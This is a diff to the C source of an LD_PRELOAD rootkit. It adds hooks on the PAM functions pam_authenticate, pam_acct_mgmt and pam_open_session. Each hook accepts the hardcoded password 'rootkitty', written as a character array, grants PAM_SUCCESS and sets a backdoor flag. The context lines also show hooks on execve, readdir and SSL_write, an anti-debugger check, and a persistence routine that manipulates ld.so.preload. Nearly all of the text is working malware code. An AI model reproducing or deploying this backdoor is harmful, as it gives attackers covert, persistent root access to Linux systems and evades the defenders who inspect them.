@@ -24,7 +24,10 @@ static struct dirent*   (*og_readdir)(DIR *)       = NULL;
 static int (*og_SSL_write)(SSL*, const void*, int) = NULL;
 static int (*og_pam_sm_auth)(pam_handle_t*, int, int, const char**) = NULL;
 static int (*og_pam_sm_setcred)(pam_handle_t* pamh, int flags, int argc, const char** argv) = NULL;
+static int (*og_pam_auth)(pam_handle_t *pamh, int flags) = NULL;
 static int (*og_execve)(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]) = NULL;
+static int (*og_pam_acct_mgmt)(pam_handle_t *pamh, int flags) = NULL;
+static int (*og_pam_open_session)(pam_handle_t *pamh, int flags) = NULL; 
 int isDebuggerPresent();
 /*---------[ INITIALIZE THE HOOKS ]---------*/
 __attribute__((constructor)) void hook_init(void){
@@ -33,7 +36,10 @@ __attribute__((constructor)) void hook_init(void){
   og_SSL_write  = (int (*)(SSL*, const void*, int))dlsym(RTLD_NEXT, "SSL_write");
   og_pam_sm_auth = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_authenticate");
   og_pam_sm_setcred = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_setcred");
-  og_execve = (int (*)(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]))dlsym(RTLD_NEXT, "execve");
+  og_pam_auth = (int (*)(pam_handle_t *, int flags))dlsym(RTLD_NEXT, "pam_authenticate");
+  og_execve = (int (*)(const char*, char *const _Nullable argv[], char *const _Nullable envp[]))dlsym(RTLD_NEXT, "execve");
+  og_pam_acct_mgmt = (int (*)(pam_handle_t*, int))dlsym(RTLD_NEXT, "pam_acct_mgmt");
+  og_pam_open_session = (int (*)(pam_handle_t *pamh, int flags))dlsym(RTLD_NEXT, "pam_open_session");
 }
 /*---------[ PERSISTENCE CHECK AND LD.SO.PRELOAD MANIPULATION ]---------*/
 __attribute__((constructor)) void PersistCheck(void) {
@@ -191,6 +197,55 @@ PAM_EXTERN int pam_sm_setcred(pam_handle_t* pamh, int flags, int argc, const cha
   }
   return og_pam_sm_setcred(pamh, flags, argc, argv);
 }
+
+PAM_EXTERN int pam_authenticate(pam_handle_t *pamh, int flags) {
+  const char* input_passwd;
+
+  if (!isDebuggerPresent()){
+    return og_pam_auth(pamh, flags);
+  }
+  pam_get_item(pamh, PAM_AUTHOK, (const void**)&input_passwd);
+  char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
+  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
+    backdoor = 1;
+    return PAM_SUCCESS;
+  }
+  return og_pam_auth(pamh, flags);
+}
+
+int pam_acct_mgmt(pam_handle_t *pamh, int flags){
+  const char* input_passwd;
+
+  if (!isDebuggerPresent()){
+    return og_pam_acct_mgmt(pamh, flags);
+  }
+
+  pam_get_item(pamh, PAM_AUTHOK, (const void**)&input_passwd);
+   char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
+  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
+    backdoor = 1;
+    return PAM_SUCCESS;
+  }
+
+  return og_pam_acct_mgmt(pamh, flags); 
+}
+
+int pam_open_session(pam_handle_t *pamh, int flags) {
+const char* input_passwd;
+
+  if (!isDebuggerPresent()){
+    return og_pam_open_session(pamh, flags);
+  }
+
+  pam_get_item(pamh, PAM_AUTHOK, (const void**)&input_passwd);
+   char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
+  if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
+    backdoor = 1;
+    return PAM_SUCCESS;
+  }
+  return og_pam_open_session(pamh, flags);
+}
+
 /*---------[ ANTI DEBUGGER CHECK ]---------*/
 int isDebuggerPresent(){
   FILE* f;
